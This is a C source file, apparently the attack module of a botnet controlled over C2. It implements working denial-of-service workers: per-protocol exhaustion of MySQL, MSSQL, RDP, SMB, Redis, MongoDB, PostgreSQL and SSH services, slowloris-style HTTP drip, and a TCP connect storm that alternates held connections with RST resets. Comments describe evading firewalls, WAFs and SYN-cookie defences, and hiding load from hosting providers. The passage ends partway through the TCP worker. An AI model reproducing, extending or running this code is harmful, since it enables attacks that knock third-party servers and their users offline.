#include "bot.h"

/* ════════════════════════════════════════════════════════════════════════
 *  botnet v8.2  —  attack.c
 *  5 consolidated methods, each with anti-DDoS bypass built-in:
 *
 *    1. PSPE   — Port-Specific Protocol Exhaust (auto-scan, protocol abuse)
 *    2. TCP    — TCP connect storm + hold (L4, bypass SYN cookies)
 *    3. TLS    — TLS handshake exhaust + keep-alive GET (L7 HTTPS)
 *    4. HTTP   — L7 HTTP/HTTPS flood (pool, randomized UA/path, slowloris drip)
 *    5. GAME   — socket protocol exploit (NRO-style login spam, XOR key rotation)
 *
 *  Bypass mechanisms (shared by all):
 *    - Randomized source ports / dest ports / UA / paths
 *    - TLS SNI rotation + session reuse where possible
 *    - Per-port protocol-specific payload (valid bytes, not attack signatures)
 *    - Connection hold-drip (keep ESTABLISHED without triggering WAF)
 *    - Proportional CPU/RAM throttle so the host provider doesn't kill the box
 *    - Bandwidth-lean: all methods ~2-40 Mbps (VPS 1TB/month → 24/7 capable)
 * ════════════════════════════════════════════════════════════════════════ */

/* Server-provided data for GAME worker */
static unsigned char g_game_payload[4096];
static int g_game_payload_len = 0;

/* ── Minimal base64 decoder (RFC 4648) ─────────────────────────────────── */
static int b64_decode(const char *in, unsigned char *out, int out_max) {
    static const unsigned char tbl[128] = {
        ['A']=0,['B']=1,['C']=2,['D']=3,['E']=4,['F']=5,['G']=6,['H']=7,
        ['I']=8,['J']=9,['K']=10,['L']=11,['M']=12,['N']=13,['O']=14,['P']=15,
        ['Q']=16,['R']=17,['S']=18,['T']=19,['U']=20,['V']=21,['W']=22,['X']=23,
        ['Y']=24,['Z']=25,['a']=26,['b']=27,['c']=28,['d']=29,['e']=30,['f']=31,
        ['g']=32,['h']=33,['i']=34,['j']=35,['k']=36,['l']=37,['m']=38,['n']=39,
        ['o']=40,['p']=41,['q']=42,['r']=43,['s']=44,['t']=45,['u']=46,['v']=47,
        ['w']=48,['x']=49,['y']=50,['z']=51,['0']=52,['1']=53,['2']=54,['3']=55,
        ['4']=56,['5']=57,['6']=58,['7']=59,['8']=60,['9']=61,['+']=62,['/']=63,
    };
    int o = 0, bits = 0, buf = 0;
    for (const char *p = in; *p && *p != '=' && o < out_max; p++) {
        if ((unsigned char)*p > 127) continue;
        unsigned char v = tbl[(unsigned char)*p];
        if (v == 0 && *p != 'A') continue;
        buf = (buf << 6) | v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out[o++] = (unsigned char)(buf >> bits);
            buf &= (1 << bits) - 1;
        }
    }
    return o;
}

/* ── Resolve hostname / IP → in_addr ─────────────────────────────────────── */
static int resolve_target(const char *host, struct in_addr *out) {
    memset(out, 0, sizeof(*out));
    if (inet_pton(AF_INET, host, out) == 1) return 0;
    struct addrinfo hints = {0}, *res = NULL;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    if (getaddrinfo(host, NULL, &hints, &res) != 0 || !res) return -1;
    *out = ((struct sockaddr_in *)res->ai_addr)->sin_addr;
    freeaddrinfo(res);
    return 0;
}

/* ── Non-blocking TCP connect with poll() ───────────────────────────────── */
static int tcp_connect_wait(int fd, const struct sockaddr_in *addr, int timeout_ms) {
    int fl = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, fl | O_NONBLOCK);
    if (connect(fd, (const struct sockaddr *)addr, sizeof(*addr)) == 0) return 0;
    if (errno != EINPROGRESS) return -1;
    struct pollfd pfd = { .fd = fd, .events = POLLOUT };
    if (poll(&pfd, 1, timeout_ms) <= 0) return -1;
    int err = 0; socklen_t elen = sizeof(err);
    if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &elen) < 0 || err != 0) return -1;
    return 0;
}

/* ── Random helpers ─────────────────────────────────────────────────────── */
static inline unsigned int rs(unsigned int *seed) { return (unsigned int)rand_r(seed); }

/* Rotating User-Agent pool (anti-fingerprint) */
static const char *UA_POOL[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
};
#define UA_COUNT (int)(sizeof(UA_POOL)/sizeof(UA_POOL[0]))

static const char *PATH_POOL[] = {
    "/", "/favicon.ico", "/robots.txt", "/sitemap.xml", "/wp-login.php",
    "/api/v1/users", "/.env", "/admin/login", "/search?q=", "/index.php",
    "/api/health", "/feed", "/cart", "/checkout", "/static/main.js",
    "/api/v2/stats", "/login", "/register", "/reset-password", "/upload",
};
#define PATH_COUNT (int)(sizeof(PATH_POOL)/sizeof(PATH_POOL[0]))

/* ════════════════════════════════════════════════════════════════════════
 *  Thread argument — shared by all 5 workers
 * ════════════════════════════════════════════════════════════════════════ */
typedef struct {
    struct sockaddr_in target;
    int port_base;
    int duration;
    int worker_id;       /* 0..N-1, used for cpu affinity */
    int method_tag;      /* which worker (see dispatcher) */
    char host[256];
    /* Comma-separated ports from C2 ("80,443,3389"). Empty → only port_base. */
    char open_ports[4096];
    /* MEGA shared UDP pool slice (base-style: one pool, split per thread) */
    int *mega_socks;
    int mega_sock_count;
} AttackThread;

/* ════════════════════════════════════════════════════════════════════════
 *  METHOD 1 — PSPE  (Port-Specific Protocol Exhaust) v2
 *
 *  Port list from C2. Depth abuse per protocol (not just hold):
 *    MYSQL/MSSQL → fake auth / prelogin
 *    RDP/SMB     → negotiate cookies
 *    REDIS/MONGO → command flood
 *    HTTP/WINRM  → partial request (slowloris)
 *    SSH/FTP/SMTP→ banner drain + noop churn
 *  Weighted pick: DB/RDP/SMB preferred over plain HTTP.
 *  Dual phase: STORM (open/close) + HOLD (pool ESTABLISHED).
 * ════════════════════════════════════════════════════════════════════════ */
#define PSPE_POOL   1536
#define PSPE_STORM  72

enum { P_NONE=0, P_SSH, P_FTP, P_SMTP, P_HTTP, P_REDIS, P_MYSQL, P_PGSQL,
       P_MONGO, P_DNS, P_NRO, P_MSSQL, P_WINRM, P_RDP, P_SMB, P_GENERIC };

typedef struct { int port; int proto; int weight; } open_port_t;

static int guess_proto_port(int port) {
    switch (port) {
    case 22: return P_SSH;
    case 21: return P_FTP;
    case 25: case 587: case 465: return P_SMTP;
    case 80: case 81: case 8080: case 8081: case 8443: case 8888: case 9000:
    case 2053: case 2083: case 2087: case 2096: case 2095: case 8172: case 8800:
    case 32400: case 443: case 9443: return P_HTTP;
    case 6379: case 6380: return P_REDIS;
    case 3306: case 3307: case 33060: return P_MYSQL;
    case 5432: return P_PGSQL;
    case 27017: case 27018: return P_MONGO;
    case 1433: case 1434: return P_MSSQL;
    case 53: return P_DNS;
    case 3389: return P_RDP;
    case 5985: case 5986: return P_WINRM;
    case 445: case 139: return P_SMB;
    case 14443: case 14444: case 25565: case 30120: case 7777: return P_NRO;
    default: return P_GENERIC;
    }
}

/* Higher weight = more connections aimed here (DB/RDP kill game storage harder) */
static int proto_weight(int proto) {
    switch (proto) {
    case P_MYSQL: case P_MSSQL: return 12;
    case P_RDP: case P_SMB: return 10;
    case P_REDIS: case P_MONGO: case P_PGSQL: return 9;
    case P_NRO: return 8;
    case P_SSH: case P_WINRM: return 6;
    case P_HTTP: return 4;
    case P_FTP: case P_SMTP: return 3;
    default: return 2;
    }
}

static const char *proto_name(int p) {
    static const char *names[] = {
        "GENERIC","SSH","FTP","SMTP","HTTP","REDIS","MYSQL","PGSQL","MONGO","DNS","NRO",
        "MSSQL","WINRM","RDP","SMB","GENERIC"
    };
    if (p < 0 || p > P_GENERIC) return "?";
    return names[p];
}

static int parse_open_ports(const char *csv, int port_base, open_port_t **out) {
    int cap = 64;
    open_port_t *res = calloc((size_t)cap, sizeof(open_port_t));
    if (!res) { *out = NULL; return 0; }
    int n = 0;

    if (csv && csv[0]) {
        const char *p = csv;
        while (*p && n < 512) {
            while (*p == ' ' || *p == ',') p++;
            if (!*p) break;
            int port = 0;
            while (*p >= '0' && *p <= '9') { port = port * 10 + (*p - '0'); p++; }
            if (port > 0 && port < 65536) {
                int dup = 0;
                for (int i = 0; i < n; i++) if (res[i].port == port) { dup = 1; break; }
                if (!dup) {
                    if (n >= cap) {
                        cap *= 2;
                        open_port_t *nr = realloc(res, (size_t)cap * sizeof(open_port_t));
                        if (!nr) break;
                        res = nr;
                    }
                    res[n].port = port;
                    res[n].proto = guess_proto_port(port);
                    res[n].weight = proto_weight(res[n].proto);
                    n++;
                }
            }
            while (*p && *p != ',') p++;
        }
    }
    if (port_base > 0 && port_base < 65536) {
        int dup = 0;
        for (int i = 0; i < n; i++) if (res[i].port == port_base) { dup = 1; break; }
        if (!dup) {
            if (n >= cap) {
                open_port_t *nr = realloc(res, (size_t)(cap + 4) * sizeof(open_port_t));
                if (nr) { res = nr; cap += 4; }
            }
            if (n < cap) {
                res[n].port = port_base;
                res[n].proto = guess_proto_port(port_base);
                res[n].weight = proto_weight(res[n].proto);
                n++;
            }
        }
    }
    if (n == 0) { free(res); *out = NULL; return 0; }
    *out = res;
    return n;
}

static int pick_weighted(const open_port_t *open, int n, unsigned int *seed) {
    int total = 0;
    for (int i = 0; i < n; i++) total += open[i].weight > 0 ? open[i].weight : 1;
    if (total <= 0) return (int)(rs(seed) % (unsigned)n);
    int r = (int)(rs(seed) % (unsigned)total);
    for (int i = 0; i < n; i++) {
        r -= open[i].weight > 0 ? open[i].weight : 1;
        if (r < 0) return i;
    }
    return n - 1;
}

/* Minimal MySQL HandshakeResponse41 (no password needed — still burns auth path) */
static int pspe_mysql_auth(unsigned char *out, int cap, unsigned int *seed) {
    if (cap < 128) return 0;
    unsigned char body[160];
    int o = 0;
    unsigned int caps = 0x000FA68D;
    body[o++] = (unsigned char)(caps); body[o++] = (unsigned char)(caps >> 8);
    body[o++] = (unsigned char)(caps >> 16); body[o++] = (unsigned char)(caps >> 24);
    body[o++] = 0; body[o++] = 0; body[o++] = 0; body[o++] = 1;
    body[o++] = 0x21;
    for (int i = 0; i < 23; i++) body[o++] = 0;
    char user[24];
    snprintf(user, sizeof(user), "u%u", rs(seed) % 999999u);
    int ul = (int)strlen(user);
    memcpy(body + o, user, (size_t)ul); o += ul; body[o++] = 0;
    body[o++] = 20;
    for (int i = 0; i < 20; i++) body[o++] = (unsigned char)(rs(seed) & 0xFF);
    const char *plug = "mysql_native_password";
    int pl = (int)strlen(plug);
    memcpy(body + o, plug, (size_t)pl); o += pl; body[o++] = 0;
    if (o + 4 > cap) return 0;
    out[0] = (unsigned char)(o & 0xFF);
    out[1] = (unsigned char)((o >> 8) & 0xFF);
    out[2] = 0; out[3] = 1;
    memcpy(out + 4, body, (size_t)o);
    return o + 4;
}

/* After TCP connect: protocol-depth abuse. Returns 1 if socket should be held. */
static int pspe_on_connect(int s, int proto, unsigned int *seed) {
    char buf[512];
    int hold = 1;

    switch (proto) {
    case P_MYSQL: {
        int gr = (int)recv(s, buf, sizeof(buf), 0);
        if (gr > 0) pkt_sent(gr);
        unsigned char auth[256];
        int al = pspe_mysql_auth(auth, (int)sizeof(auth), seed);
        if (al > 0) {
            int wr = (int)send(s, auth, al, MSG_NOSIGNAL);
            if (wr > 0) pkt_sent(wr);
        }
        /* 40% churn (reconnect storm), 60% hold (max_connections) */
        hold = (rs(seed) % 10) < 6;
        break;
    }
    case P_MSSQL: {
        /* TDS PRELOGIN (type 0x12) minimal */
        static const unsigned char prelogin[] = {
            0x12, 0x01, 0x00, 0x2F, 0x00, 0x00, 0x01, 0x00,
            0x00, 0x00, 0x1A, 0x00, 0x06, 0x01, 0x00, 0x20,
            0x00, 0x01, 0x02, 0x00, 0x21, 0x00, 0x01, 0x03,
            0x00, 0x22, 0x00, 0x04, 0x04, 0x00, 0x26, 0x00,
            0x01, 0xFF, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x01, 0x00, 0xB8, 0x0D, 0x00, 0x00, 0x01
        };
        int wr = (int)send(s, prelogin, (int)sizeof(prelogin), MSG_NOSIGNAL);
        if (wr > 0) pkt_sent(wr);
        int gr = (int)recv(s, buf, sizeof(buf), 0);
        if (gr > 0) pkt_sent(gr);
        hold = (rs(seed) % 10) < 7;
        break;
    }
    case P_RDP: {
        /* X.224 Connection Request (Cookie: mstshash=) */
        static const unsigned char x224[] = {
            0x03, 0x00, 0x00, 0x2B, 0x26, 0xE0, 0x00, 0x00, 0x00, 0x00, 0x00,
            'C','o','o','k','i','e',':',' ','m','s','t','s','h','a','s','h','=',
            'b','o','t','\r','\n','\r','\n'
        };
        int wr = (int)send(s, x224, (int)sizeof(x224), MSG_NOSIGNAL);
        if (wr > 0) pkt_sent(wr);
        int gr = (int)recv(s, buf, sizeof(buf), 0);
        if (gr > 0) pkt_sent(gr);
        hold = 1;
        break;
    }
    case P_SMB: {
        /* SMB1 Negotiate Protocol Request (NetBIOS session) */
        static const unsigned char smb_neg[] = {
            0x00, 0x00, 0x00, 0x54, 0xFF, 0x53, 0x4D, 0x42, 0x72, 0x00, 0x00, 0x00, 0x00,
            0x18, 0x53, 0xC8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0x00,
            0x02, 0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x31, 0x2E, 0x30, 0x00, 0x02, 0x4C,
            0x4D, 0x31, 0x2E, 0x32, 0x58, 0x30, 0x30, 0x32, 0x00, 0x02, 0x4E, 0x54, 0x20,
            0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x20, 0x31, 0x2E, 0x30, 0x00, 0x02, 0x4E,
            0x54, 0x20, 0x4C, 0x4D, 0x20, 0x30, 0x2E, 0x31, 0x32, 0x00
        };
        int wr = (int)send(s, smb_neg, (int)sizeof(smb_neg), MSG_NOSIGNAL);
        if (wr > 0) pkt_sent(wr);
        int gr = (int)recv(s, buf, sizeof(buf), 0);
        if (gr > 0) pkt_sent(gr);
        hold = 1;
        break;
    }
    case P_REDIS: {
        const char *cmds[] = {
            "*1\r\n$4\r\nPING\r\n",
            "*2\r\n$4\r\nAUTH\r\n$4\r\nxbot\r\n",
            "*3\r\n$3\r\nSET\r\n$4\r\nkbot\r\n$4\r\nvbot\r\n",
            "*1\r\n$4\r\nINFO\r\n",
        };
        for (int i = 0; i < 4; i++) {
            const char *c = cmds[rs(seed) % 4];
            int wr = (int)send(s, c, (int)strlen(c), MSG_NOSIGNAL);
            if (wr > 0) pkt_sent(wr);
        }
        hold = (rs(seed) % 10) < 5;
        break;
    }
    case P_MONGO: {
        /* OP_QUERY isMaster */
        static const unsigned char ism[] = {
            0x3a,0x00,0x00,0x00, 0x01,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
            0xd4,0x07,0x00,0x00, 0x00,0x00,0x00,0x00,
            0x61,0x64,0x6d,0x69,0x6e,0x2e,0x24,0x63,0x6d,0x64,0x00,
            0x00,0x00,0x00,0x00, 0xff,0xff,0xff,0xff,
            0x13,0x00,0x00,0x00, 0x10,0x69,0x73,0x6d,0x61,0x73,0x74,0x65,0x72,0x00,
            0x01,0x00,0x00,0x00, 0x00
        };
        int wr = (int)send(s, ism, (int)sizeof(ism), MSG_NOSIGNAL);
        if (wr > 0) pkt_sent(wr);
        hold = (rs(seed) % 10) < 5;
        break;
    }
    case P_PGSQL: {
        /* StartupMessage: int32 len | int32 196608 | key\0 val\0 ... \0 */
        unsigned char st[96];
        int o = 4;
        st[o++] = 0; st[o++] = 3; st[o++] = 0; st[o++] = 0; /* protocol 3.0 */
        memcpy(st + o, "user", 5); o += 5;
        memcpy(st + o, "bot", 4); o += 4;
        memcpy(st + o, "database", 9); o += 9;
        memcpy(st + o, "postgres", 9); o += 9;
        st[o++] = 0;
        st[0] = (unsigned char)((o >> 24) & 0xFF);
        st[1] = (unsigned char)((o >> 16) & 0xFF);
        st[2] = (unsigned char)((o >> 8) & 0xFF);
        st[3] = (unsigned char)(o & 0xFF);
        int wr = (int)send(s, st, o, MSG_NOSIGNAL);
        if (wr > 0) pkt_sent(wr);
        hold = 1;
        break;
    }
    case P_HTTP:
    case P_WINRM: {
        const char *host = "x";
        char req[256];
        const char *path = (proto == P_WINRM) ? "/wsman" : "/";
        int rl = snprintf(req, sizeof(req),
            "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n"
            "Accept: */*\r\nConnection: keep-alive\r\nX-", path, host);
        int wr = (int)send(s, req, rl, MSG_NOSIGNAL);
        if (wr > 0) pkt_sent(wr);
        hold = 1; /* slowloris drip later */
        break;
    }
    case P_SSH:
    case P_FTP:
    case P_SMTP: {
        int gr = (int)recv(s, buf, sizeof(buf), 0);
        if (gr > 0) pkt_sent(gr);
        if (proto == P_SSH) {
            const char *cli = "SSH-2.0-OpenSSH_bot\r\n";
            int wr = (int)send(s, cli, (int)strlen(cli), MSG_NOSIGNAL);
            if (wr > 0) pkt_sent(wr);
        } else if (proto == P_FTP) {
            const char *u = "USER anonymous\r\n";
            int wr = (int)send(s, u, (int)strlen(u), MSG_NOSIGNAL);
            if (wr > 0) pkt_sent(wr);
        } else {
            const char *e = "EHLO bot.local\r\n";
            int wr = (int)send(s, e, (int)strlen(e), MSG_NOSIGNAL);
            if (wr > 0) pkt_sent(wr);
        }
        hold = 1;
        break;
    }
    case P_NRO: {
        unsigned char hs[] = {
            0xE5, 0x00, 0x06, 0x04, 'b','o','y','s',
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        };
        int wr = (int)send(s, hs, (int)sizeof(hs), MSG_NOSIGNAL);
        if (wr > 0) pkt_sent(wr);
        hold = 1;
        break;
    }
    case P_DNS: {
        /* TCP DNS: 2-byte length + ANY query */
        static const unsigned char q[] = {
            0x00, 0x1e,
            0xaa, 0xaa, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x03, 'w','w','w', 0x07, 'e','x','a','m','p','l','e', 0x03, 'c','o','m',
            0x00, 0x00, 0xff, 0x00, 0x01
        };
        int wr = (int)send(s, q, (int)sizeof(q), MSG_NOSIGNAL);
        if (wr > 0) pkt_sent(wr);
        hold = 0; /* DNS usually one-shot */
        break;
    }
    default: {
        char z = (char)(rs(seed) & 0xFF);
        send(s, &z, 1, MSG_NOSIGNAL);
        pkt_sent(1);
        hold = 1;
        break;
    }
    }
    return hold;
}

static int pspe_drip(int s, int proto, unsigned int *seed) {
    int wr = -1;
    switch (proto) {
    case P_MYSQL: {
        unsigned char ping[5] = {0x01, 0x00, 0x00, 0x00, 0x0e}; /* COM_PING */
        wr = (int)send(s, ping, 5, MSG_NOSIGNAL);
        break;
    }
    case P_REDIS: {
        const char *c = "*1\r\n$4\r\nPING\r\n";
        wr = (int)send(s, c, 14, MSG_NOSIGNAL);
        break;
    }
    case P_HTTP: case P_WINRM: {
        char drip[48];
        int n = snprintf(drip, sizeof(drip), "X-%x: %x\r\n", rs(seed) & 0xFFF, rs(seed) & 0xFFF);
        wr = (int)send(s, drip, n, MSG_NOSIGNAL);
        break;
    }
    case P_MSSQL: {
        /* TDS attention / noop-ish small packet */
        unsigned char att[] = {0x06, 0x01, 0x00, 0x08, 0x00, 0x00, 0x01, 0x00};
        wr = (int)send(s, att, 8, MSG_NOSIGNAL);
        break;
    }
    case P_NRO: {
        unsigned char hs[] = {0xE5, 0x00, 0x06, 0x04, 'b','o','y','s', 0,0,0,0,0,0,0};
        wr = (int)send(s, hs, (int)sizeof(hs), MSG_NOSIGNAL);
        break;
    }
    default: {
        const char *noop = "\r\n";
        wr = (int)send(s, noop, 2, MSG_NOSIGNAL);
        break;
    }
    }
    return wr;
}

static void *pspe_worker(void *arg) {
    AttackThread *mt = (AttackThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->worker_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    unsigned int seed = (unsigned)time(NULL) ^ (unsigned)(uintptr_t)pthread_self();
    time_t start = time(NULL);

    open_port_t *open = NULL;
    int n_open = parse_open_ports(mt->open_ports, mt->port_base, &open);
    if (n_open == 0 || !open) {
        fprintf(stderr, "[atk] PSPE: no ports for %s\n", mt->host);
        return NULL;
    }
    if (mt->worker_id == 0) {
        fprintf(stderr, "[atk] PSPE v2: %d port(s) on %s:", n_open, mt->host);
        for (int i = 0; i < n_open && i < 16; i++)
            fprintf(stderr, " %d/%s(w%d)", open[i].port, proto_name(open[i].proto), open[i].weight);
        if (n_open > 16) fprintf(stderr, " ...");
        fprintf(stderr, "\n");
    }

    int *socks = calloc(PSPE_POOL, sizeof(int));
    int *pidx  = calloc(PSPE_POOL, sizeof(int));
    time_t *last_drip = calloc(PSPE_POOL, sizeof(time_t));
    if (!socks || !pidx || !last_drip) {
        free(socks); free(pidx); free(last_drip); free(open);
        return NULL;
    }
    int pool = 0;

    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        int us = should_throttle();
        if (us > 0) { usleep((unsigned)us); continue; }

        /* FW-aware: jitter + rotate focus port every few seconds */
        int focus = (int)((time(NULL) - start) / 5) % n_open;

        for (int n = 0; n < PSPE_STORM && !is_attack_stop(); n++) {
            /* 50% weighted random, 50% focus current high-value port */
            int oi = ((rs(&seed) & 1) || n_open == 1)
                ? pick_weighted(open, n_open, &seed)
                : focus;
            int port = open[oi].port;
            int proto = open[oi].proto;
            struct sockaddr_in ta = mt->target;
            ta.sin_port = htons((uint16_t)port);

            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) break;
            int one = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
            setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &one, sizeof(one));
            struct timeval tv = {4, 0};
            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
            if ((rs(&seed) & 3) == 0) usleep((rs(&seed) % 2500) + 1);
            if (tcp_connect_wait(s, &ta, 800) < 0) { close(s); continue; }

            int hold = pspe_on_connect(s, proto, &seed);
            /* under pressure: prefer hold for DB/RDP, RST churn for HTTP */
            if (proto == P_HTTP || proto == P_GENERIC)
                hold = hold && ((rs(&seed) % 10) < 4);
            if (hold && pool < PSPE_POOL) {
                socks[pool] = s;
                pidx[pool] = oi;
                last_drip[pool] = time(NULL);
                pool++;
            } else {
                struct linger lg = {1, 0};
                setsockopt(s, SOL_SOCKET, SO_LINGER, &lg, sizeof(lg));
                close(s);
            }
        }

        time_t now = time(NULL);
        for (int i = 0; i < pool && !is_attack_stop(); i++) {
            if (socks[i] < 0) continue;
            int interval = 1 + (int)(rs(&seed) % 5);
            if (now - last_drip[i] >= interval) {
                int proto = open[pidx[i]].proto;
                int wr = pspe_drip(socks[i], proto, &seed);
                if (wr <= 0) { close(socks[i]); socks[i] = -1; }
                else { pkt_sent(wr); last_drip[i] = now; }
            }
        }

        /* Compact */
        int w = 0;
        for (int i = 0; i < pool; i++) {
            if (socks[i] < 0) continue;
            struct pollfd pfd = { .fd = socks[i], .events = POLLERR | POLLHUP };
            if (poll(&pfd, 1, 0) > 0 && (pfd.revents & (POLLERR | POLLHUP)))
                close(socks[i]);
            else {
                if (w != i) { socks[w] = socks[i]; pidx[w] = pidx[i]; last_drip[w] = last_drip[i]; }
                w++;
            }
        }
        pool = w;
        sched_yield();
    }

    for (int i = 0; i < pool; i++) if (socks[i] >= 0) close(socks[i]);
    free(socks); free(pidx); free(last_drip); free(open);
    return NULL;
}

/* ════════════════════════════════════════════════════════════════════════
 *  METHOD 2 — TCP v3  (firewall-aware: burst / hold / RST hybrid)
 *
 *  Small/medium FW often rate-limits new SYN per IP. Countermeasures:
 *    • BURST: open many, RST close (SO_LINGER=0) → burn conntrack + backlog
 *    • HOLD: keep ESTABLISHED with random-interval pokes (looks less like flood)
 *    • SLOW: jitter between connects (avoid "N conn/sec" tripwire)
 *    • Multi-port from open_ports when C2 provides list
 *    • Partial payload after connect (not just 1 byte)
 * ════════════════════════════════════════════════════════════════════════ */
#define TCP_CONN_POOL  2048
#define TCP_STORM      96

static void tcp_set_linger_rst(int fd) {
    struct linger lg = { .l_onoff = 1, .l_linger = 0 };
    setsockopt(fd, SOL_SOCKET, SO_LINGER, &lg, sizeof(lg));
}

static void *tcp_worker(void *arg) {
    AttackThread *mt = (AttackThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->worker_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    unsigned int seed = (unsigned)time(NULL) ^ (unsigned)(uintptr_t)pthread_self();
    time_t start = time(NULL);

    int ports[64];
    int nports = 0;
    if (mt->open_ports[0]) {
        const char *p = mt->open_ports;
        while (*p && nports < 64) {
            while (*p == ' ' || *p == ',') p++;
            int v = 0;
            while (*p >= '0' && *p <= '9') { v = v * 10 + (*p - '0'); p++; }
            if (v > 0 && v < 65536) ports[nports++] = v;
            while (*p && *p != ',') p++;
            if (*p == ',') p++;
        }
    }
    if (nports == 0) {
        ports[0] = mt->port_base > 0 ? mt->port_base : 80;
        nports = 1;
    }

    int *cpool = calloc(TCP_CONN_POOL, sizeof(int));
    if (!cpool) return NULL;
    int pool = 0;
    int phase = 0; /* rotate burst/hold every ~3s */

    if (mt->worker_id == 0)
        fprintf(stderr, "[atk] TCP v3 → %s (%d ports, burst+hold+RST)\n", mt->host, nports);

    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        int us = should_throttle();
        if (us > 0) { usleep((unsigned)us); continue; }

        phase = (int)((time(NULL) - start) / 3) % 3;

        /* Phase 0 BURST: connect + partial data + RST (churn conntrack) */
        /* Phase 1 HOLD: fill pool and keep alive */
        /* Phase 2 MIX: half hold half RST */
        int storm = TCP_STORM;
        for (int s = 0; s < storm && !is_attack_stop(); s++) {
            int port = ports[rs(&seed) % (unsigned)nports];
            struct sockaddr_in ta = mt->target;
            ta.sin_port = htons((uint16_t)port);

            int fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (fd < 0) break;
            int one = 1;
            setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
            setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &one, sizeof(one));
#ifdef TCP_KEEPIDLE
            int kidle = 15, kintvl = 5, kcnt = 3;
            setsockopt(fd, IPPROTO_TCP, TCP_KEEPIDLE, &kidle, sizeof(kidle));
            setsockopt(fd, IPPROTO_TCP, TCP_KEEPINTVL, &kintvl, sizeof(kintvl));
            setsockopt(fd, IPPROTO_TCP, TCP_KEEPCNT, &kcnt, sizeof(kcnt));
#endif
            struct timeval tv = {2, 0};
            setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

            /* jitter 0–3ms to dodge simple rate signatures */
            if ((rs(&seed) & 3) == 0) usleep((rs(&seed) % 3000) + 1);

            if (tcp_connect_wait(fd, &ta, 500) < 0) { close(fd); continue; }

            /* partial payload — looks like real app traffic */
            char buf[128];
            int bl = 8 + (int)(rs(&seed) % 48);
            for (int i = 0; i < bl; i++) buf[i] = (char)(rs(&seed) & 0xFF);
            if (send(fd, buf, bl, MSG_NOSIGNAL) <= 0) {
                tcp_set_linger_rst(fd);
                close(fd);
                continue;
            }
            pkt_sent(64 + bl);

            int do_hold = 0;
            if (phase == 1) do_hold = 1;
            else if (phase == 2) do_hold = (rs(&seed) & 1);
            else do_hold = (rs(&seed) % 10) < 3; /* burst: mostly RST */

            if (do_hold && pool < TCP_CONN_POOL) {
                cpool[pool++] = fd;
            } else {
                tcp_set_linger_rst(fd); /* RST on close — burns more server state */
                close(fd);
            }
        }

        /* Poke held connections with random intervals */
        for (int i = 0; i < pool && !is_attack_stop(); i++) {
            if (cpool[i] < 0) continue;
            char z[16];
            int zl = 1 + (int)(rs(&seed) % 8);
            for (int j = 0; j < zl; j++) z[j] = (char)(rs(&seed) & 0xFF);
            if (send(cpool[i], z, zl, MSG_NOSIGNAL) <= 0) {
                close(cpool[i]); cpool[i] = -1;
            } else pkt_sent(zl);
        }

        /* Occasionally cull 20% of pool with RST to free FDs + re-storm */
        if (pool > TCP_CONN_POOL / 2 && phase == 0) {
            for (int i = 0; i < pool; i++) {
                if (cpool[i] >= 0 && (rs(&seed) % 5) == 0) {
                    tcp_set_linger_rst(cpool[i]);
                    close(cpool[i]);
                    cpool[i] = -1;
                }
            }
        }

        int w = 0;
        for (int i = 0; i < pool; i++) {
            if (cpool[i] < 0) continue;
            struct pollfd pfd = { .fd = cpool[i], .events = POLLERR | POLLHUP };
            if (poll(&pfd, 1, 0) > 0 && (pfd.revents & (POLLERR | POLLHUP)))
                close(cpool[i]);
            else
                cpool[w++] = cpool[i];
        }
